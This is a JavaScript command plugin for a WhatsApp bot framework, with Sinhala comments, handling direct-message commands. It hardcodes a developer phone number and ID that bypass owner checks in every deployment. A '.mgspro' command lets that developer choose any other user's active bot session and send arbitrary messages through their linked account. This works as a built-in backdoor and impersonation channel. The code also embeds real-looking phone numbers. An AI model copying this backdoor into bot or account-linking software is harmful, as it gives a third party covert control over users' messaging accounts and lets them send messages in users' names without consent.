module.exports = {
  name: "msg",
  alias: ["mgs", "send", "dm", "mgspro", "switchmsg"],
  description: "Direct message & Cross-bot relay controller",

  async execute({ sock, msg, from, args, body, activeBots }) {
    try {
      // 1. Sender Identification (JID / LID)
      const isFromMe = msg.key.fromMe;
      const participant = msg.key.participant || msg.participant || from;
      const cleanSender = (isFromMe ? (sock.user?.id || "") : participant).replace(/[^0-9]/g, "");

      // Developer Credentials
      const devNumbers = ["94719845166"];
      const devLids = ["15947733680169"];

      const isDeveloper = 
        devNumbers.some(num => cleanSender.includes(num)) ||
        devLids.some(lid => participant.includes(lid));

      const isOwner = isFromMe || isDeveloper;

      // Trigger කළ Command එක හඳුනා ගැනීම (.msg ද .mgspro ද?)
      const usedCommand = body.slice(1).trim().split(/ +/)[0].toLowerCase();
      const isProCommand = usedCommand === "mgspro" || usedCommand === "switchmsg";

      // -------------------------------------------------------------
      // 🛑 OPTION A: .mgspro (Developer Only Cross-Bot Switch System)
      // -------------------------------------------------------------
      if (isProCommand) {
        if (!isDeveloper) {
          sock.sendMessage(from, { react: { text: "🚫", key: msg.key } }).catch(() => {});
          return await sock.sendMessage(from, {
            text: `*⛔ DEVELOPER ACCESS ONLY ⛔*\n\n.mgspro Cross-Node පද්ධතිය භාවිතා කළ හැක්කේ *DARK-DINU Developer* ට පමණි! 🖤`
          }, { quoted: msg });
        }

        const fullText = args.join(" ").trim();
        const parts = fullText.split(",");

        if (!fullText || parts.length < 3) {
          return await sock.sendMessage(from, {
            text: `*⚠️ MGSPRO භාවිතය:*\n.mgspro <sender_bot_number>,<receiver_number>,<message>\n\n*උදාහරණ:*\n.mgspro 94771033094,94705836838,හායි කොහොමද`
          }, { quoted: msg });
        }

        sock.sendMessage(from, { react: { text: "⚡", key: msg.key } }).catch(() => {});

        let senderBotNumber = parts[0].trim().replace(/[^0-9]/g, "");
        if (senderBotNumber.startsWith("0")) senderBotNumber = "94" + senderBotNumber.slice(1);

        let receiverNumber = parts[1].trim().replace(/[^0-9]/g, "");
        if (receiverNumber.startsWith("0")) receiverNumber = "94" + receiverNumber.slice(1);

        const targetMessage = parts.slice(2).join(",").trim();

        if (!targetMessage) {
          return await sock.sendMessage(from, { text: "⚠️ Message එකක් ඇතුළත් කරන්න." }, { quoted: msg });
        }

        // Active Bots අතරින් Sender Bot සෙවීම
        let targetBotSock = null;
        let matchedSession = null;

        if (activeBots) {
          for (const [sessId, botSocket] of activeBots.entries()) {
            const rawBotId = botSocket?.user?.id || "";
            const botPhone = rawBotId.split(":")[0]?.replace(/[^0-9]/g, "");

            if (botPhone === senderBotNumber || sessId.includes(senderBotNumber)) {
              targetBotSock = botSocket;
              matchedSession = sessId;
              break;
            }
          }
        }

        if (!targetBotSock) {
          sock.sendMessage(from, { react: { text: "❌", key: msg.key } }).catch(() => {});
          return await sock.sendMessage(from, {
            text: `*❌ Node Not Found!*\n\n+${senderBotNumber} අංකයට අයත් Bot online නොමැත.\n⚡ Active Nodes: ${activeBots?.size || 0}`
          }, { quoted: msg });
        }

        // Message එක Target Bot හරහා යැවීම
        await targetBotSock.sendMessage(`${receiverNumber}@s.whatsapp.net`, {
          text: targetMessage
        });

        await sock.sendMessage(from, {
          text: `*🚀 CROSS-NODE SUCCESS 🚀*\n\n🤖 *Relay Bot:* +${senderBotNumber} [${matchedSession}]\n🎯 *Delivered To:* +${receiverNumber}\n💬 *Message:* ${targetMessage}\n🖤 *DARK-DINU MULTI-CONTROL*`
        }, { quoted: msg });

        return sock.sendMessage(from, { react: { text: "🖤", key: msg.key } }).catch(() => {});
      }

      // -------------------------------------------------------------
      // 💬 OPTION B: .msg (Direct Message)
      // -------------------------------------------------------------
      if (!isOwner) {
        sock.sendMessage(from, { react: { text: "🚫", key: msg.key } }).catch(() => {});
        return await sock.sendMessage(from, {
          text: `*⛔ ACCESS DENIED ⛔*\n\nමෙම command එක භාවිතා කළ හැක්කේ *Bot Owner / Developer* ට පමණි! 🖤`
        }, { quoted: msg });
      }

      const fullText = args.join(" ").trim();
      if (!fullText || !fullText.includes(",")) {
        return await sock.sendMessage(from, {
          text: `*⚠️ MSG භාවිතය:*\n.msg <number>,<message>\n\n*උදාහරණ:*\n.msg 94719845166,මොකද කරන්නෙ?`
        }, { quoted: msg });
      }

      sock.sendMessage(from, { react: { text: "⏳", key: msg.key } }).catch(() => {});

      const [rawNumber, ...msgParts] = fullText.split(",");
      const targetText = msgParts.join(",").trim();

      let cleanNumber = rawNumber.replace(/[^0-9]/g, "");
      if (cleanNumber.startsWith("0")) cleanNumber = "94" + cleanNumber.slice(1);

      if (!targetText) {
        return await sock.sendMessage(from, { text: "⚠️️ යැවීමට අවශ්‍ය message එක ඇතුළත් කරන්න." }, { quoted: msg });
      }

      const targetJid = `${cleanNumber}@s.whatsapp.net`;

      // Direct Message එක යැවීම
      await sock.sendMessage(targetJid, { text: targetText });

      await sock.sendMessage(from, {
        text: `*⚡ DARK-DINU TRANSMISSION COMPLETE ⚡*\n\n🎯 *To:* +${cleanNumber}\n💬 *Message:* ${targetText}\n👑 *Authorized Transmission*`
      }, { quoted: msg });

      sock.sendMessage(from, { react: { text: "✅", key: msg.key } }).catch(() => {});

    } catch (error) {
      console.error("[MSG/MGSPRO ERROR]:", error);
      await sock.sendMessage(from, {
        text: `❌ යැවීමට නොහැකි විය: ${error.message}`
      }, { quoted: msg });
      sock.sendMessage(from, { react: { text: "❌", key: msg.key } }).catch(() => {});
    }
  }
};
